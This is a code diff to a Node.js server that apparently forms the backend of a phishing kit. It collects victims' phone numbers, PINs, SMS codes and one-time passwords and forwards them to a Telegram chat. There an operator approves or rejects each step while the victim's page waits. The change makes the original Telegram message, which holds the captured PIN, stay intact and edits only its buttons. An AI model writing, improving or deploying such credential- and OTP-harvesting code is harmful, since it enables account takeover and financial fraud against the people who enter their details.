@@ -121,6 +121,23 @@ async function editTelegramMessage(chatId, messageId, text) {
     }
 }
 
+// ✅ NEW: Only edits the buttons — keeps original message intact
+async function editTelegramButtons(chatId, messageId, replyMarkup) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                reply_markup: replyMarkup,
+            }),
+        });
+    } catch (err) {
+        console.error('editMessageReplyMarkup failed:', err.message);
+    }
+}
+
 // ============================================
 // IN-MEMORY STORES
 // ============================================
@@ -129,8 +146,6 @@ const sessions = new Map();
 const smsSubmissions = new Map();
 const otpVerifications = new Map();
 
-// Pending approvals — keyed by requestId
-// { requestId: { type: 'login'|'sms'|'otp', phone, pin, extra, status, createdAt, messageId } }
 const pendingApprovals = new Map();
 
 // ============================================
@@ -399,7 +414,6 @@ app.post('/api/verify-otp', async (req, res) => {
 
 // --------------------------------------------
 // GET /api/approval/status/:requestId
-// Frontend polls this for ALL steps (login, sms, otp)
 // --------------------------------------------
 app.get('/api/approval/status/:requestId', (req, res) => {
     const { requestId } = req.params;
@@ -411,14 +425,14 @@ app.get('/api/approval/status/:requestId', (req, res) => {
 
     return res.json({
         ok: true,
-        status: pending.status, // 'pending' | 'approved' | 'rejected'
+        status: pending.status,
         type: pending.type,
     });
 });
 
 // --------------------------------------------
 // POST /api/telegram/callback
-// Webhook handler — buttons for all types
+// ✅ FIXED: Only changes buttons, keeps original message (PIN stays!)
 // --------------------------------------------
 app.post('/api/telegram/callback', async (req, res) => {
     try {
@@ -445,24 +459,19 @@ app.post('/api/telegram/callback', async (req, res) => {
                 return res.json({ ok: true });
             }
 
-            // Build type label
-            const typeLabel = { login: '🔐 Login', sms: '📩 SMS', otp: '🔐 OTP' }[pending.type] || 'Request';
-
             if (action === 'approve') {
                 pending.status = 'approved';
                 pendingApprovals.set(requestId, pending);
 
                 await answerCallbackQuery(callbackQueryId, '✅ Approved');
 
+                // ✅ Only change buttons — original message stays
                 if (messageId && chatId) {
-                    await editTelegramMessage(chatId, messageId,
-                        `✅ <b>APPROVED</b>\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `${typeLabel}\n` +
-                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
-                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
-                        `👉 User can now proceed.`
-                    );
+                    await editTelegramButtons(chatId, messageId, {
+                        inline_keyboard: [[
+                            { text: '✅ APPROVED', callback_data: 'noop' },
+                        ]],
+                    });
                 }
                 console.log('✅ Approved:', requestId);
 
@@ -472,15 +481,13 @@ app.post('/api/telegram/callback', async (req, res) => {
 
                 await answerCallbackQuery(callbackQueryId, '❌ Rejected');
 
+                // ✅ Only change buttons — original message stays
                 if (messageId && chatId) {
-                    await editTelegramMessage(chatId, messageId,
-                        `❌ <b>REJECTED</b>\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `${typeLabel}\n` +
-                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
-                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
-                        `🚫 User denied.`
-                    );
+                    await editTelegramButtons(chatId, messageId, {
+                        inline_keyboard: [[
+                            { text: '❌ REJECTED', callback_data: 'noop' },
+                        ]],
+                    });
                 }
                 console.log('❌ Rejected:', requestId);
 
@@ -534,4 +541,5 @@ app.listen(PORT, () => {
     console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
     console.log(`   Trust proxy: enabled`);
     console.log(`   Admin Approval: ✅ ACTIVE (login, SMS, OTP)`);
+    console.log(`   Button-only edit: ✅ ACTIVE (message stays intact)`);
 });
